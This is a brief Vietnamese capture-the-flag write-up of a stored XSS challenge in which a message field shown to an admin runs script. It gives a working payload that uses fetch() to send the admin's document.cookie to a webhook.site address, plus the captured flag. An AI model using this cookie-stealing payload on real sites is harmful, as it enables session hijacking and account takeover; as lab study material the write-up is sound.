![image](../img_web_client/10.1.png)
chall cung cấp feature nhập vào message cho admin
![image](../img_web_client/10.2.png)

vì tiêu đề là XSS Store nên mình tiến hành exploit luôn

khi nhập vào ô message `<script>alert(origin)</script>`
![image](../img_web_client/10.3.png)
chứng tỏ XSS dính ở message

payload: 
`<script>fetch('https://webhook.site/xxxxxx-6417-40b7-bca9-c3dd61171562?flag='+document.cookie)</script>`

chờ admin truy cập, hứng tại webhook
![image](../img_web_client/10.4.png)
flag: `NkI9qe4cdLIO2P7MIsWS8ofD6`


